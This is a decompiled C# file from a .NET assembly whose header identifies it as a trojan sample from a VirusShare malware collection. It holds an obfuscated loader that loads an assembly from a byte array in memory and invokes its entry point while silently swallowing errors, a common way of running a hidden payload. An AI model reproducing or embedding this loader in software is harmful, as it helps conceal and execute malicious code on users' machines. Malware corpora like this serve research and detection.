﻿// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Explorer, Version=1.0.0.0, Culture=neutral, PublicKeyToken=1133f7a8419a0062
// MVID: 9EBACA4B-5CC4-4E1D-BB8B-A34A1921D651
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Delf.cjha-09fdf048be5ee692c4b7f67dcd746d321697af807f132f1e395c35c2bc7d244c.exe

using \u0004;
using System.Reflection;
using System.Runtime.InteropServices;

namespace \u0004
{
  internal class \u0001
  {
    private static Assembly \u0001;

    public static void \u0003([In] string[] obj0)
    {
      try
      {
        \u0001.\u0001.EntryPoint.Invoke((object) null, (object[]) obj0);
      }
      catch
      {
      }
    }

    public static bool \u0003([In] byte[] obj0)
    {
      try
      {
        \u0001.\u0001 = Assembly.Load(obj0);
        if ((object) \u0001.\u0001.EntryPoint == null)
          return false;
      }
      catch
      {
        return false;
      }
      return true;
    }
  }
}